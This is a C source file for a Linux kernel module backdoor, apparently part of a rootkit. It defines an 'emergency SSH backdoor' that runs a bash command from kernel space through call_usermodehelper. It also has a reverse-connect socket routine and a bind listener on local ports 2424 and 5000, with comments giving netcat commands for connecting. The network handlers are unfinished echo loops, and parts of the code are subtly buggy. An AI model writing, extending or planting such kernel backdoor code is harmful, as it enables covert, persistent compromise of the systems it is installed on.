#include "backdoor.h"

#include <linux/types.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <linux/un.h>
#include <linux/unistd.h>
#include <linux/wait.h>
#include <linux/ctype.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/sock.h>
#include <net/tcp.h>

#include <linux/version.h>

static void backdoor_ssh(void) {

    char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static int rk_sendbuff(struct socket *sock, char *buffer, int length)
{
    struct msghdr msg;
    mm_segment_t oldfs;
    struct iovec iov;
    int len = 0;

    iov.iov_base = (char*) buffer; 
    iov.iov_len = (__kernel_size_t) length;

    msg.msg_flags = MSG_NOSIGNAL;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
    #endif
    #if LINUX_VERSION_CODE < KERNEL_VERSION(4,1,0)
        len = sock_sendmsg(sock,&msg,length);
    #else
        len = sock_sendmsg(sock, &msg);
    #endif

    return len;
}


static int rk_recvbuff(struct socket *sock, char *buffer, int length)
{
    struct msghdr msg;
    struct iovec iov;
    int len = 0;
    mm_segment_t oldfs;

    iov.iov_base = buffer;
    iov.iov_len  = length;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(3,19,0)
       msg.msg_iov = &iov;
       msg.msg_iovlen = 1;
    #else
      iov_iter_init(&msg.msg_iter, WRITE, &iov, 1, length);
    #endif

    oldfs = get_fs(); 
    set_fs(KERNEL_DS);
    len = sock_recvmsg(sock,&msg,length,0); //no wait
    set_fs(oldfs);

    if ((len!=-EAGAIN)&&(len!=0)&&(len!=(-107)))
        printk("rk_recvbuff recieved %i bytes \n",len);
    return len;
}

static void backdoor_reverse(void) {

    /* client bind with : nc -lvp 2424 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    char *buff = NULL;
    char *buff2 = NULL;
    current->flags |= PF_NOFREEZE;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        printk("Error during creation of socket; terminating\n");
        return;
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(2424);

    error = sock->ops->connect(sock, (struct sockaddr*) &sin, sizeof(sin), !O_NONBLOCK);
    if (error < 0) {
        printk("Error during connection of socket; terminating\n");
        sock_release(sock);
        return;
    }
    
    buff = kmalloc(512, GFP_KERNEL);
    buff2 = kmalloc(512, GFP_KERNEL);
    if (buff == NULL)
    {
        printk("No mem\n");
        sock_release(sock);
        return;
    }

    int tt = 0;
    while(true) {
        if (signal_pending(current))
            break;
        tt = rk_recvbuff(sock, buff, 512);
        //printk("tt length %i\n", tt);
        if (tt > 0) {
            int res = 0;
            //printk("socket length %i\n", strlen(buff));
            strncpy(buff2, buff, tt);
            //printk("socket length %i\n", strlen(buff2));
            res = rk_sendbuff(sock, buff2, tt);

            //cleanup the buffer
            memset(buff, '\0', sizeof(buff));
            memset(buff2, '\0', sizeof(buff2));
            if (res == 0) {
                printk("Error during connection of socket; terminating\n");
                break;
            }
            tt = 0;
        } else {
            printk("Error during connection of socket; terminating\n");
            break;
        }
    }

    sock_release(sock);
    kfree(buff);
    kfree(buff2);
}

static void backdoor_bind(void) {

    /* client connect with : nc 127.0.0.1 5000 */

    struct socket *sock;
    struct sockaddr_in sin;
    int error;
    current->flags |= PF_NOFREEZE;

    error = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (error < 0) {
        printk("Error during creation of socket; terminating\n");
        return;
    }

    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = in_aton("127.0.0.1");
    sin.sin_port = htons(5000);

    error = sock->ops->bind(sock, (struct sockaddr *) &sin, sizeof(sin));
    if (error < 0) {
        printk("Error binding socket\n");
        sock_release(sock);
        return;
    }

    error = sock->ops->listen(sock, 5);
    if (error < 0) {
        printk("Error listening on socket \n");
        sock_release(sock);
        return;
    }
    char *buff = NULL;
    buff = kmalloc(512, GFP_KERNEL);
    int tt = 0;
    struct socket *newsock;
    newsock=(struct socket*)kmalloc(sizeof(struct socket),GFP_KERNEL);
    error = sock_create(PF_INET,SOCK_STREAM,IPPROTO_TCP,&newsock);
    if(error<0) {
        printk("Error create newsock error\n");
        kfree(buff);
        sock_release(sock);  
        return; 
    }
    //wait incoming connection
    while (1) {
        error = newsock->ops->accept(sock,newsock,O_NONBLOCK);
        if(error >= 0) {
            while(tt = rk_recvbuff(newsock, buff, 512)) {
                if (tt > 0) {
                    rk_sendbuff(newsock, buff, tt);
                    memset(buff, '\0', sizeof(buff)); // clean the buffer
                    tt = 0;
                }
                if(signal_pending(current)) {
                    break;
                }
            }
        }
        if(signal_pending(current)) {
            break;
        }
    }

    kfree(buff);
    sock_release(newsock); 
    sock_release(sock);    

}

void backdoor(void) {

    /* EMERGENCY SSH BACKDOOR */
    if (ALLOW_SSH == 1) {
        backdoor_ssh();
    }

    /* TODO REVERSE BACKDOOR */
    //backdoor_reverse();

    /* TODO ACTIVATOR BACKDOOR */
    backdoor_bind();
}